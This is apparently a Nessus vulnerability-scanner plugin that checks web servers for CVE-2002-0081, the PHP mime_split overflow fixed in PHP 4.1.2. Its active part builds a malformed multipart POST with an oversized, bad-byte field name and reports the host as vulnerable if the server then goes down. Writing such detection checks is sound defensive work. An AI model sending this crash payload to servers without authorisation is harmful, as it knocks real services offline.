#
# This script was written by Thomas Reinke <reinke@securityspace.com>
#
# Modified by H D Moore & Renaud Deraison to actually test for the flaw
#
# See the Nessus Scripts License for details
#

# Changes by Tenable:
# - Revised plugin title (4/23/009)

include("compat.inc");

if (description)
{
 script_id(10867);
 script_version("$Revision: 1.37 $");
 script_cvs_date("$Date: 2014/05/26 15:30:09 $");

 script_cve_id("CVE-2002-0081");
 script_bugtraq_id(4183);
 script_osvdb_id(720, 34719);

 script_name(english:"PHP mime_split Function POST Request Overflow");
 script_summary(english:"Checks for version of PHP");

 script_set_attribute(attribute:"synopsis", value:"Arbitrary code may be run on the remote server.");
 script_set_attribute(attribute:"description", value:
"The remote host is running a version of PHP earlier than 4.1.2.

There are several flaws in how PHP handles multipart/form-data POST
requests, any one of which could allow an attacker to gain remote
access to the system.");
 script_set_attribute(attribute:"solution", value:"Upgrade to PHP 4.1.2.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"exploit_framework_core", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2002/02/27");
 script_set_attribute(attribute:"plugin_publication_date", value:"2002/02/28");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:php:php");
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2002-2014 Thomas Reinke");
 script_family(english:"Web Servers");

 script_dependencie("find_service1.nasl", "http_version.nasl", "webmirror.nasl");
 script_require_keys("Settings/ParanoidReport", "www/PHP");
 script_require_ports("Services/www", 80);

 exit(0);
}

include("audit.inc");
include("backport.inc");
include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_http_port(default:80);
if (! get_port_state(port)) exit(0, "Port "+port+" is closed.");
if ( ! can_host_php(port:port) ) exit(0, "The web server on port "+port+" does not support PHP.");

banner = get_http_banner(port:port);
if(!banner)exit(1, "No HTTP banner on port "+port+".");
php = get_php_version(banner:banner);
if ( ! php ) exit(0, "No PHP banner on port "+port+".");

if(http_is_dead(port:port))exit(1, "The web server on port "+port+" is dead.");

 if(!safe_checks())
 {
  files = get_kb_list(string("www/", port, "/content/extensions/php*"));

  if(isnull(files))file = "/default.php";
  else {
  	files = make_list(files);
	file = files[0];
	}

  if(is_cgi_installed_ka(item:file, port:port))
  {
   boundary1 = string("-NESSUS!");
   boundary2 = string("--NESSUS!");
   clen = "567";
   dblq = raw_string(0x22);
   badb = raw_string(0x12);


   postdata = string("POST ", file, " HTTP/1.1\r\n", "Host: ", get_host_name(), "\r\n");
   postdata = string(postdata, "Referer: http://", get_host_name(), "/", file, "\r\n");
   postdata = string(postdata, "Content-type: multipart/form-data; boundary=", boundary1, "\r\n");
   postdata = string(postdata, "Content-Length: ", clen, "\r\n\r\n", boundary2, "\r\n");
   postdata = string(postdata, "Content-Disposition: form-data; name=");



  len = strlen(dblq) + strlen(badb) + strlen(dblq);
  big = crap(clen - len);
  postdata = string(postdata, dblq, badb, dblq, big, dblq);

  soc = http_open_socket(port);
  if(!soc) exit(1, "TCP connection failed to port "+port+".");

  send(socket:soc, data:postdata);

  r = http_recv(socket:soc);
  http_close_socket(soc);
  if(http_is_dead(port: port, retry: 3)) { security_hole(port); }
  }
 }

